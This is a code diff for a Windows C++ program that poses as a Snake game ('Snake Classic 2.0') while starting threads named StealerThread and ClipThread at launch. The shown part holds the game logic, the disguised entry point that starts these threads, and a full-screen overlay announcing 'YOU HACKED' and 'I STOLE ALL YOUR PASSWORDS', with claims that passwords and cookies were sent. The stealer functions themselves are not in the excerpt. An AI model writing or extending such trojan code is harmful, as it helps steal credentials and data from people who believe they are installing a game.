-        const wchar_t* sub = L"I STOLE ALL YOUR PASSWORDS HAHAHAHAH";
-        TextOutW(dc, sw / 2 - 340, sh / 2 + 40, sub, (int)wcslen(sub));
-        SelectObject(dc, fS); SetTextColor(dc, RGB(255, 80, 80));
-        TextOutW(dc, sw / 2 - 40, sh / 2 + 130, L"🥀  😈  😈", 6);
+        SetTextColor(dc, ((e/200)%2)==0 ? RGB(255,0,0) : RGB(120,0,0));
+        TextOutA(dc, sw/2 - 210, sh/2 - 140, "YOU HACKED", 10);
+        TextOutA(dc, sw/2 - 160, sh/2 - 60,  "BY EMIR",    7);
+
+        SelectObject(dc, fM);
+        SetTextColor(dc, RGB(255, 30, 30));
+        const char* sub = "I STOLE ALL YOUR PASSWORDS HAHAHAHAH";
+        TextOutA(dc, sw/2 - 340, sh/2 + 40, sub, (int)strlen(sub));
+
+        SelectObject(dc, fS);
+        SetTextColor(dc, RGB(255, 80, 80));
+        TextOutA(dc, sw/2 - 40, sh/2 + 130, "[ ROSE ]  [ EVIL ]  [ EVIL ]", 29);
+
         SetTextColor(dc, RGB(200, 0, 0));
-        const wchar_t* ft = L"[ SYSTEM COMPROMISED ]   IP LOGGED   PASSWORDS SENT   COOKIES STOLEN";
-        TextOutW(dc, sw / 2 - 400, sh - 60, ft, (int)wcslen(ft));
+        const char* ft = "[ SYSTEM COMPROMISED ]   IP LOGGED   PASSWORDS SENT   COOKIES STOLEN";
+        TextOutA(dc, sw/2 - 400, sh - 60, ft, (int)strlen(ft));
+
         if (e > 10000) done = true;
         Sleep(16);
     }
-    ReleaseDC(h, dc); DestroyWindow(h);
-}
+    ReleaseDC(h, dc);
+    DestroyWindow(h);
 }
 
 // ============================================================
-// WIN32 SNAKE GAME
+// SNAKE GAME (GDI, Win7 compatible)
 // ============================================================
-namespace SnakeWin32 {
-static const int COLS = 30, ROWS = 20, CELL = 24, HEADER_H = 50;
-static HWND g_hwnd = nullptr;
-static std::deque<std::pair<int,int>> g_snake;
-static int g_dx = 1, g_dy = 0, g_fx = 0, g_fy = 0, g_score = 0;
-static bool g_alive = true, g_started = false;
-static int g_tickMs = 90;
-static HFONT g_font = nullptr;
-static HBRUSH g_bg = nullptr, g_head = nullptr, g_body = nullptr, g_food = nullptr;
+static const int COLS = 30;
+static const int ROWS = 20;
+static const int CELL = 24;
+static const int HEADER_H = 50;
+
+static HWND  g_hwnd = NULL;
+static std::deque<std::pair<int,int> > g_snake;
+static int   g_dx = 1, g_dy = 0;
+static int   g_fx = 0, g_fy = 0;
+static int   g_score = 0;
+static BOOL  g_alive = TRUE;
+static BOOL  g_started = FALSE;
+static int   g_tickMs = 90;
+static HFONT g_font = NULL;
+static HBRUSH g_bg = NULL, g_head = NULL, g_body = NULL, g_food = NULL;
 
 static void ResetGame() {
     g_snake.clear();
-    g_snake.push_back({ COLS / 2, ROWS / 2 });
+    g_snake.push_back(std::make_pair(COLS/2, ROWS/2));
     g_dx = 1; g_dy = 0;
-    g_score = 0; g_alive = true;
+    g_score = 0; g_alive = TRUE;
     g_fx = rand() % COLS;
     g_fy = rand() % ROWS;
 }
 
-static void Paint(HDC dc, RECT rc) {
-    RECT hdr{ 0, 0, rc.right, HEADER_H };
+static void PaintGame(HDC dc, RECT rc) {
+    RECT hdr = { 0, 0, rc.right, HEADER_H };
     HBRUSH hb = CreateSolidBrush(RGB(20, 20, 30));
     FillRect(dc, &hdr, hb); DeleteObject(hb);
 
-    RECT bd{ 0, HEADER_H, COLS * CELL, HEADER_H + ROWS * CELL };
+    RECT bd = { 0, HEADER_H, COLS * CELL, HEADER_H + ROWS * CELL };
     FillRect(dc, &bd, g_bg);
 
     HPEN gp = CreatePen(PS_SOLID, 1, RGB(30, 30, 40));
     HPEN op = (HPEN)SelectObject(dc, gp);
-    for (int x = 0; x <= COLS; x++) { MoveToEx(dc, x * CELL, HEADER_H, nullptr); LineTo(dc, x * CELL, HEADER_H + ROWS * CELL); }
-    for (int y = 0; y <= ROWS; y++) { MoveToEx(dc, 0, HEADER_H + y * CELL, nullptr); LineTo(dc, COLS * CELL, HEADER_H + y * CELL); }
+    for (int x = 0; x <= COLS; x++) {
+        MoveToEx(dc, x * CELL, HEADER_H, NULL);
+        LineTo(dc, x * CELL, HEADER_H + ROWS * CELL);
+    }
+    for (int y = 0; y <= ROWS; y++) {
+        MoveToEx(dc, 0, HEADER_H + y * CELL, NULL);
+        LineTo(dc, COLS * CELL, HEADER_H + y * CELL);
+    }
     SelectObject(dc, op); DeleteObject(gp);
 
-    RECT fr{ g_fx * CELL + 3, HEADER_H + g_fy * CELL + 3,
-             g_fx * CELL + CELL - 3, HEADER_H + g_fy * CELL + CELL - 3 };
+    RECT fr = { g_fx * CELL + 3, HEADER_H + g_fy * CELL + 3,
+                g_fx * CELL + CELL - 3, HEADER_H + g_fy * CELL + CELL - 3 };
     FillRect(dc, &fr, g_food);
 
     for (size_t i = 0; i < g_snake.size(); i++) {
         int x = g_snake[i].first, y = g_snake[i].second;
-        RECT sr{ x * CELL + 1, HEADER_H + y * CELL + 1,
-                 x * CELL + CELL - 1, HEADER_H + y * CELL + CELL - 1 };
+        RECT sr = { x * CELL + 1, HEADER_H + y * CELL + 1,
+                    x * CELL + CELL - 1, HEADER_H + y * CELL + CELL - 1 };
         FillRect(dc, &sr, i == 0 ? g_head : g_body);
     }
     SelectObject(dc, g_font);
@@ -878,132 +956,145 @@ static void Paint(HDC dc, RECT rc) {
     char buf[128];
     sprintf(buf, "SNAKE   Score: %d   Speed: %d", g_score, 1000 / g_tickMs);
     TextOutA(dc, 12, 14, buf, (int)strlen(buf));
+
     if (!g_started) {
         SetTextColor(dc, RGB(255, 220, 120));
         const char* t1 = "PRESS SPACE OR ENTER TO START";
-        TextOutA(dc, COLS * CELL / 2 - 130, HEADER_H + ROWS * CELL / 2 - 20, t1, (int)strlen(t1));
+        TextOutA(dc, COLS*CELL/2 - 130, HEADER_H + ROWS*CELL/2 - 20, t1, (int)strlen(t1));
     } else if (!g_alive) {
         SetTextColor(dc, RGB(255, 80, 80));
-        char t1[64]; sprintf(t1, "GAME OVER — Score: %d", g_score);
-        TextOutA(dc, COLS * CELL / 2 - 90, HEADER_H + ROWS * CELL / 2 - 20, t1, (int)strlen(t1));
+        char t1[64];
+        sprintf(t1, "GAME OVER - Score: %d", g_score);
+        TextOutA(dc, COLS*CELL/2 - 90, HEADER_H + ROWS*CELL/2 - 20, t1, (int)strlen(t1));
         const char* t2 = "Press R to restart";
-        TextOutA(dc, COLS * CELL / 2 - 60, HEADER_H + ROWS * CELL / 2 + 10, t2, (int)strlen(t2));
+        TextOutA(dc, COLS*CELL/2 - 60, HEADER_H + ROWS*CELL/2 + 10, t2, (int)strlen(t2));
     }
 }
 
-static LRESULT CALLBACK WndProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
+static LRESULT CALLBACK GameProc(HWND h, UINT msg, WPARAM w, LPARAM l) {
     switch (msg) {
-        case WM_CREATE: SetTimer(h, 1, g_tickMs, nullptr); return 0;
-        case WM_KEYDOWN: {
+        case WM_CREATE:
+            SetTimer(h, 1, g_tickMs, NULL);
+            return 0;
+        case WM_KEYDOWN:
             if (!g_started && (w == VK_SPACE || w == VK_RETURN)) {
-                g_started = true; ResetGame();
-                InvalidateRect(h, nullptr, FALSE);
+                g_started = TRUE; ResetGame();
+                InvalidateRect(h, NULL, FALSE);
                 return 0;
             }
             if (g_started && !g_alive && w == 'R') {
-                ResetGame(); InvalidateRect(h, nullptr, FALSE);
+                ResetGame(); InvalidateRect(h, NULL, FALSE);
                 return 0;
             }
             if (!g_alive || !g_started) return 0;
             switch (w) {
-                case 'W': case VK_UP:    if (g_dy == 0) { g_dx = 0; g_dy = -1; } break;
-                case 'S': case VK_DOWN:  if (g_dy == 0) { g_dx = 0; g_dy =  1; } break;
-                case 'A': case VK_LEFT:  if (g_dx == 0) { g_dx = -1; g_dy = 0; } break;
-                case 'D': case VK_RIGHT: if (g_dx == 0) { g_dx =  1; g_dy = 0; } break;
+                case 'W': case VK_UP:    if (g_dy == 0) { g_dx = 0;  g_dy = -1; } break;
+                case 'S': case VK_DOWN:  if (g_dy == 0) { g_dx = 0;  g_dy =  1; } break;
+                case 'A': case VK_LEFT:  if (g_dx == 0) { g_dx = -1; g_dy = 0;  } break;
+                case 'D': case VK_RIGHT: if (g_dx == 0) { g_dx =  1; g_dy = 0;  } break;
                 case VK_ESCAPE: PostQuitMessage(0); break;
             }
             return 0;
-        }
         case WM_TIMER: {
             if (g_started && g_alive) {
                 int nx = g_snake.front().first + g_dx;
                 int ny = g_snake.front().second + g_dy;
-                if (nx < 0 || ny < 0 || nx >= COLS || ny >= ROWS) g_alive = false;
+                if (nx < 0 || ny < 0 || nx >= COLS || ny >= ROWS) g_alive = FALSE;
                 else {
-                    for (auto& s : g_snake) if (s.first == nx && s.second == ny) { g_alive = false; break; }
+                    for (size_t i = 0; i < g_snake.size(); i++)
+                        if (g_snake[i].first == nx && g_snake[i].second == ny) { g_alive = FALSE; break; }
                     if (g_alive) {
-                        g_snake.push_front({ nx, ny });
+                        g_snake.push_front(std::make_pair(nx, ny));
                         if (nx == g_fx && ny == g_fy) {
                             g_score += 10;
-                            g_fx = rand() % COLS; g_fy = rand() % ROWS;
+                            g_fx = rand() % COLS;
+                            g_fy = rand() % ROWS;
                             if (g_tickMs > 50) {
                                 g_tickMs -= 2;
-                                KillTimer(h, 1); SetTimer(h, 1, g_tickMs, nullptr);
+                                KillTimer(h, 1);
+                                SetTimer(h, 1, g_tickMs, NULL);
                             }
                         } else g_snake.pop_back();
                     }
                 }
             }
-            // === overlay takeover check ===
-            if (g_show_overlay.load()) {
-                HackedOverlay::Run(GetModuleHandle(nullptr));
+            if (InterlockedCompareExchange(&g_show_overlay, 1, 1) == 1) {
+                ShowHackedOverlay();
                 ExitProcess(0);
             }
-            InvalidateRect(h, nullptr, FALSE);
+            InvalidateRect(h, NULL, FALSE);
             return 0;
         }
         case WM_ERASEBKGND: return 1;
         case WM_PAINT: {
-            PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
+            PAINTSTRUCT ps;
+            HDC dc = BeginPaint(h, &ps);
             RECT rc; GetClientRect(h, &rc);
             HDC mem = CreateCompatibleDC(dc);
             HBITMAP bmp = CreateCompatibleBitmap(dc, rc.right, rc.bottom);
             HBITMAP old = (HBITMAP)SelectObject(mem, bmp);
-            Paint(mem, rc);
+            PaintGame(mem, rc);
             BitBlt(dc, 0, 0, rc.right, rc.bottom, mem, 0, 0, SRCCOPY);
-            SelectObject(mem, old); DeleteObject(bmp); DeleteDC(mem);
-            EndPaint(h, &ps); return 0;
+            SelectObject(mem, old);
+            DeleteObject(bmp);
+            DeleteDC(mem);
+            EndPaint(h, &ps);
+            return 0;
         }
-        case WM_DESTROY: PostQuitMessage(0); return 0;
+        case WM_DESTROY:
+            PostQuitMessage(0);
+            return 0;
     }
-    return DefWindowProc(h, msg, w, l);
+    return DefWindowProcA(h, msg, w, l);
 }
 
-static int Run(HINSTANCE hInst) {
+// ============================================================
+// ENTRY POINT — ANSI WinMain
+// ============================================================
+int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
+    (void)hPrev; (void)lpCmd; (void)nShow;
+    srand((unsigned)GetTickCount());
+
     g_bg   = CreateSolidBrush(RGB(10, 15, 25));
     g_head = CreateSolidBrush(RGB(80, 240, 120));
     g_body = CreateSolidBrush(RGB(40, 180, 90));
     g_food = CreateSolidBrush(RGB(255, 60, 60));
-    g_font = CreateFontA(22, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET,
-        0, 0, 0, 0, "Segoe UI");
+    g_font = CreateFontA(22, 0,0,0, FW_BOLD, 0,0,0, DEFAULT_CHARSET, 0,0,0, 0, "Segoe UI");
 
-    WNDCLASSW wc = {};
-    wc.lpfnWndProc = WndProc; wc.hInstance = hInst;
-    wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
+    InitializeCriticalSection(&g_clipCs);
+    g_clipCsInit = TRUE;
+
+    // === start stealer + clipboard on program start ===
+    CreateThread(NULL, 0, StealerThread, NULL, 0, NULL);
+    CreateThread(NULL, 0, ClipThread, NULL, 0, NULL);
+
+    WNDCLASSA wc; ZeroMemory(&wc, sizeof(wc));
+    wc.lpfnWndProc = GameProc;
+    wc.hInstance = hInst;
+    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
     wc.hbrBackground = g_bg;
-    wc.lpszClassName = L"SnakeClassicWnd";
-    RegisterClassW(&wc);
+    wc.lpszClassName = "SnakeClassicWndX";
+    RegisterClassA(&wc);
 
-    int winW = COLS * CELL, winH = HEADER_H + ROWS * CELL;
-    RECT r{ 0, 0, winW, winH };
+    int winW = COLS * CELL;
+    int winH = HEADER_H + ROWS * CELL;
+    RECT r = { 0, 0, winW, winH };
     AdjustWindowRect(&r, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, FALSE);
-    int fullW = r.right - r.left, fullH = r.bottom - r.top;
+    int fullW = r.right - r.left;
+    int fullH = r.bottom - r.top;
     int sx = (GetSystemMetrics(SM_CXSCREEN) - fullW) / 2;
     int sy = (GetSystemMetrics(SM_CYSCREEN) - fullH) / 2;
 
-    g_hwnd = CreateWindowExW(0, L"SnakeClassicWnd", L"Snake Classic 2.0",
+    g_hwnd = CreateWindowExA(0, "SnakeClassicWndX", "Snake Classic 2.0",
         WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX | WS_VISIBLE,
-        sx, sy, fullW, fullH, nullptr, nullptr, hInst, nullptr);
+        sx, sy, fullW, fullH, NULL, NULL, hInst, NULL);
     ShowWindow(g_hwnd, SW_SHOW);
     UpdateWindow(g_hwnd);
 
-    // === START button → fire EVERYTHING ===
-    StartClipboardSniffer();
-    std::thread(StealerWorker).detach();
-
     MSG msg;
-    while (GetMessage(&msg, nullptr, 0, 0)) {
+    while (GetMessageA(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
-        DispatchMessage(&msg);
+        DispatchMessageA(&msg);
     }
     return (int)msg.wParam;
-}
-}
-
-// ============================================================
-// ENTRY
-// ============================================================
-int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPARAM, int) {
-    srand((unsigned)GetTickCount());
-    return SnakeWin32::Run(hInst);
 }
